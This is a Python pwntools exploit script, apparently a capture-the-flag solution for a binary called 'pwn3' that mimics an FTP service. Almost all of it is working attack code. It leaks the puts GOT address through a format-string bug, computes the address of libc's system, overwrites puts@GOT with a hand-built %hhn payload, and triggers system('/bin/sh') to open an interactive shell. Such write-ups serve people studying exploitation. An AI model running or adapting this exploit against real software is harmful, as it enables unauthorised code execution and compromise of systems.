#!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = 'debug'
context.arch = 'i386'
elf = ELF('./pwn3')
local = 0
if local:
	p = process('./pwn3')
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	p = remote('127.0.0.1', 8888)
	libc = ELF('./libc.so')

def get(name, choice):
	p.sendline('get')
	p.sendlineafter('enter the file name you want to get:', name)
	if choice == 0:
		data = p.recv()
		return data
	else:
		return

def put(name, content):
	p.sendline('put')
	p.sendlineafter('please enter the name of the file you want to upload:', name)
	p.sendlineafter('then, enter the content:', content)
	return

def show():
	p.sendlineafter('ftp>', 'dir')

def fmt(offset, addr, val):
	payload = ''.join(p32(addr + i) for i in range(4))
	printed = len(payload)
	fmt1 = '%{}c'
	fmt2 = '%{}$hhn'
	for i in range(4):
		byte = (val >> (i * 8)) & 0xff
		addition = (byte - printed + 256) % 256
		if addition > 0:
			payload += fmt1.format(str(addition))
		payload += fmt2.format(str(offset + i))
		printed += addition
	return payload

tmp = 'sysbdmin'
username = ''
for i in range(len(tmp)):
	username += chr(ord(tmp[i]) - 1)
print username
p.sendlineafter('Name (ftp.hacker.server:Rainism):', username)

puts_got = elf.got['puts']
log.success('puts got = ' + hex(puts_got))
offset = 8
payload = flat(['%{}$s'.format(str(offset)), puts_got])
put('AAAA', payload)
puts_addr = u32(get('AAAA', 0)[:4])
log.success('puts_addr = ' + hex(puts_addr))

system_offset = libc.symbols['system']
puts_offset = libc.symbols['puts']
system_addr = puts_addr - puts_offset + system_offset
# libc = LibcSearcher("puts", puts_addr)
# system_offset = libc.dump('system')
# puts_offset = libc.dump('puts')
# system_addr = puts_addr - puts_offset + system_offset
log.success('system_offset = ' + hex(system_offset))
log.success('puts_offset = ' + hex(puts_offset))
log.success('system_addr = ' + hex(system_addr))

# payload = fmtstr_payload(offset, {puts_got: system_addr})
payload = fmt(offset - 1, puts_got, system_addr)
put('/bin/sh;', payload)
get('/bin/sh;', 1)
show()
p.interactive()
